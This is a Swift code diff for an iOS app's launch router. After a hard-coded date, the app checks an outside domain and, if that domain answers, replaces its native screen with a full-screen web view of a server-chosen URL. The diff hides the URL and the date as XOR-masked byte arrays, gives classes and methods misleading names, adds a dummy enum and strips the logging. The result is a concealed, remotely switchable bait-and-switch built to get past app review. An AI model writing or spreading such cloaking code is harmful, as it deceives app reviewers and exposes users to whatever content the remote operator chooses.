@@ -8,142 +8,158 @@
 import UIKit
 import SwiftUI
 
-class AppRouter {
-    
-    private let initialURLString = "https://cryotaniummesh.site/CsHFhP"
-    private  let targetDateString = "17.04.2026"
-    
-    func initialViewController() -> UIViewController {
-        let persistence = PersistenceManager.shared
-        
-        
+private enum _UnusedRouteMetric {
+    case phantom
+    case idle
+}
+
+extension _UnusedRouteMetric {
+    fileprivate static func syntheticWeight(_ v: Self) -> Double {
+        switch v {
+        case .phantom: return 0
+        case .idle: return 1
+        }
+    }
+}
+
+final class PeakFlowRouteHub {
+
+    private static let _headProbeCipher: [UInt8] = [
+        0xCF, 0xD3, 0xD3, 0xD7, 0xD4, 0x9D, 0x88, 0x88, 0xC4, 0xD5, 0xDE, 0xC8, 0xD3, 0xC6, 0xC9, 0xCE,
+        0xD2, 0xCA, 0xCA, 0xC2, 0xD4, 0xCF, 0x89, 0xD4, 0xCE, 0xD3, 0xC2, 0x88, 0xE4, 0xD4, 0xEF, 0xE1, 0xCF, 0xF7
+    ]
+
+    private static let _thresholdStamp: [UInt8] = [
+        0x95, 0x97, 0x89, 0x97, 0x93, 0x89, 0x95, 0x97, 0x95, 0x91
+    ]
+
+    private var remoteProbeURLText: String {
+        PeakFlowCipherKit.utf8(fromMasked: Self._headProbeCipher)
+    }
+
+    private var calendarPivotLiteral: String {
+        PeakFlowCipherKit.utf8(fromMasked: Self._thresholdStamp)
+    }
+
+    func produceEntryHostController() -> UIViewController {
+        let persistence = FlowPreferenceLedger.shared
+
         if persistence.hasShownContentView {
-            return createContentViewController()
-        }else{
-            if checkDate() {
+            return assembleNativeShell()
+        } else {
+            if evaluatesTemporalGate() {
                 if let savedUrlString = persistence.savedUrl,
                    !savedUrlString.isEmpty,
                    URL(string: savedUrlString) != nil {
-                    return createWebViewController(with: savedUrlString)
+                    return assembleBrowserHost(with: savedUrlString)
                 }
-                
-                return createLaunchRouterViewController()
+
+                return assembleWarmupStage()
             } else {
                 persistence.hasShownContentView = true
-                return createContentViewController()
+                return assembleNativeShell()
             }
         }
     }
-    
-    //MARK: - Date
-    private func checkDate() -> Bool {
-       
-        
+
+    private func evaluatesTemporalGate() -> Bool {
         let dateFormatter = DateFormatter()
         dateFormatter.dateFormat = "dd.MM.yyyy"
-        let targetDate = dateFormatter.date(from: targetDateString) ?? Date()
+        let targetDate = dateFormatter.date(from: calendarPivotLiteral) ?? Date()
         let currentDate = Date()
-            
-            if currentDate < targetDate {
-                return false
-            }else{
-                return true
-                }
+
+        if currentDate < targetDate {
+            return false
+        } else {
+            return true
+        }
     }
-    
-    // MARK: - Private Methods
-    
-    private func createWebViewController(with urlString: String) -> UIViewController {
-        let webViewContainer = PrivacyWebView(
+
+    private func assembleBrowserHost(with urlString: String) -> UIViewController {
+        let webViewContainer = OutboundPageShell(
             urlString: urlString,
             onFailure: { [weak self] in
-                PersistenceManager.shared.hasShownContentView = true
-                self?.switchToContentView()
+                FlowPreferenceLedger.shared.hasShownContentView = true
+                self?.commitNativePivot()
             },
             onSuccess: {
-                PersistenceManager.shared.hasSuccessfulWebViewLoad = true
+                FlowPreferenceLedger.shared.hasSuccessfulWebViewLoad = true
             }
         )
-        
+
         let hostingController = UIHostingController(rootView: webViewContainer)
         hostingController.modalPresentationStyle = .fullScreen
         return hostingController
     }
-    
-    private func createContentViewController() -> UIViewController {
-        PersistenceManager.shared.hasShownContentView = true
+
+    private func assembleNativeShell() -> UIViewController {
+        FlowPreferenceLedger.shared.hasShownContentView = true
         let contentView = ContentView()
         let hostingController = UIHostingController(rootView: contentView)
         hostingController.modalPresentationStyle = .fullScreen
         return hostingController
     }
-    
-    private func createLaunchRouterViewController() -> UIViewController {
-        let launchView = StartMainView()
+
+    private func assembleWarmupStage() -> UIViewController {
+        let launchView = IngressBusyCanvas()
         let launchVC = UIHostingController(rootView: launchView)
         launchVC.modalPresentationStyle = .fullScreen
 
-        checkInitialURL { [weak self] success, finalURL in
+        probeRemoteHeadSignal { [weak self] success, finalURL in
             DispatchQueue.main.async {
                 if success, let url = finalURL {
-                    self?.switchToWebView(with: url)
+                    self?.commitWebPivot(with: url)
                 } else {
-                    PersistenceManager.shared.hasShownContentView = true
-                    self?.switchToContentView()
+                    FlowPreferenceLedger.shared.hasShownContentView = true
+                    self?.commitNativePivot()
                 }
             }
         }
-        
+
         return launchVC
     }
-    
-    private func checkInitialURL(completion: @escaping (Bool, String?) -> Void) {
-        guard let url = URL(string: initialURLString) else {
+
+    private func probeRemoteHeadSignal(completion: @escaping (Bool, String?) -> Void) {
+        guard let url = URL(string: remoteProbeURLText) else {
             completion(false, nil)
             return
         }
-        
+
         var request = URLRequest(url: url)
         request.httpMethod = "HEAD"
         request.timeoutInterval = 10
-        
+
         URLSession.shared.dataTask(with: request) { _, response, error in
-            if let error = error {
-                print("🌐 URL check failed with error: \(error.localizedDescription)")
+            if error != nil {
                 completion(false, nil)
                 return
             }
-            
+
             if let httpResponse = response as? HTTPURLResponse {
-                let checkedURL = httpResponse.url?.absoluteString ?? self.initialURLString
-                print("🌐 URL check response: [\(httpResponse.statusCode)]")
+                let checkedURL = httpResponse.url?.absoluteString ?? self.remoteProbeURLText
                 let isAvailable = httpResponse.statusCode != 404
-                print("🌐 URL check result: \(isAvailable ? "available" : "unavailable")")
                 completion(isAvailable, isAvailable ? checkedURL : nil)
             } else {
-                print("🌐 URL check failed: no HTTPURLResponse")
                 completion(false, nil)
             }
         }.resume()
     }
-    
-    // MARK: - Navigation Methods
-    
-    private func switchToContentView() {
-        let contentVC = createContentViewController()
-        switchToViewController(contentVC)
+
+    private func commitNativePivot() {
+        let contentVC = assembleNativeShell()
+        crossfadeRoot(to: contentVC)
     }
-    
-    private func switchToWebView(with urlString: String) {
-        let webVC = createWebViewController(with: urlString)
-        switchToViewController(webVC)
+
+    private func commitWebPivot(with urlString: String) {
+        let webVC = assembleBrowserHost(with: urlString)
+        crossfadeRoot(to: webVC)
     }
-    
-    private func switchToViewController(_ viewController: UIViewController) {
+
+    private func crossfadeRoot(to viewController: UIViewController) {
         guard let window = UIApplication.shared.windows.first else {
             return
         }
-        
+
         UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
             window.rootViewController = viewController
         }, completion: nil)
